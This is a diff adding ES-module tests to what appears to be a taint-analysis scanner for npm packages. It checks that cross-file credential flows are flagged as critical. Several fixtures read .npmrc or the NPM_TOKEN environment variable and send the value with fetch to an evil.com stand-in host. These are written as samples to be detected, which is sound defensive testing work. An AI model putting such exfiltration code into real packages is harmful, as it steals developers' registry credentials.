@@ -441,6 +441,105 @@ async function runModuleGraphTests() {
       cleanup(tmp);
     }
   });
+
+  // =========================================================================
+  // ES Module import/export support (Fix 3)
+  // =========================================================================
+
+  test('ES module: export function with fs.readFileSync + import { read } + fetch → cross_file_dataflow', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'package.json', JSON.stringify({ name: 'esm-pkg', version: '1.0.0' }));
+      writeFile(tmp, 'reader.mjs', `
+        import fs from 'fs';
+        export function read() {
+          return fs.readFileSync('.npmrc', 'utf8');
+        }
+      `);
+      writeFile(tmp, 'sender.mjs', `
+        import { read } from './reader';
+        const data = read();
+        fetch('https://evil.com/steal', { body: data });
+      `);
+
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      const flows = detectCrossFileFlows(graph, tainted, tmp);
+
+      assert(flows.length >= 1, 'Should detect ES module cross-file flow, got: ' + flows.length);
+      const flow = flows[0];
+      assert(flow.severity === 'CRITICAL', 'Severity should be CRITICAL');
+      assert(flow.type === 'cross_file_dataflow', 'Type should be cross_file_dataflow');
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('ES module: export default arrow with process.env + import getData + fetch → cross_file_dataflow', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'package.json', JSON.stringify({ name: 'esm-pkg2', version: '1.0.0' }));
+      writeFile(tmp, 'reader.mjs', `
+        export default () => process.env.NPM_TOKEN;
+      `);
+      writeFile(tmp, 'sender.mjs', `
+        import getData from './reader';
+        const token = getData();
+        fetch('https://evil.com', { body: token });
+      `);
+
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      const flows = detectCrossFileFlows(graph, tainted, tmp);
+
+      assert(flows.length >= 1, 'Should detect ES module default export flow, got: ' + flows.length);
+      assert(flows[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('ES module: export const token = process.env.NPM_TOKEN + import { token } + fetch → cross_file_dataflow', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'package.json', JSON.stringify({ name: 'esm-pkg3', version: '1.0.0' }));
+      writeFile(tmp, 'config.mjs', `
+        export const token = process.env.NPM_TOKEN;
+      `);
+      writeFile(tmp, 'sender.mjs', `
+        import { token } from './config';
+        fetch('https://evil.com', { body: token });
+      `);
+
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+      const flows = detectCrossFileFlows(graph, tainted, tmp);
+
+      assert(flows.length >= 1, 'Should detect ES module named const export flow, got: ' + flows.length);
+      assert(flows[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
+    } finally {
+      cleanup(tmp);
+    }
+  });
+
+  test('ES module: export function returning safe string → no tainted export', () => {
+    const tmp = makeTmpDir();
+    try {
+      writeFile(tmp, 'safe.mjs', `
+        export function safe() { return 'hello'; }
+        export const version = '1.0.0';
+      `);
+
+      const graph = buildModuleGraph(tmp);
+      const tainted = annotateTaintedExports(graph, tmp);
+
+      const exports = tainted['safe.mjs'] || {};
+      const hasTainted = Object.values(exports).some(e => e.tainted);
+      assert(!hasTainted, 'Safe ES module should have no tainted exports');
+    } finally {
+      cleanup(tmp);
+    }
+  });
 }
 
 module.exports = { runModuleGraphTests };
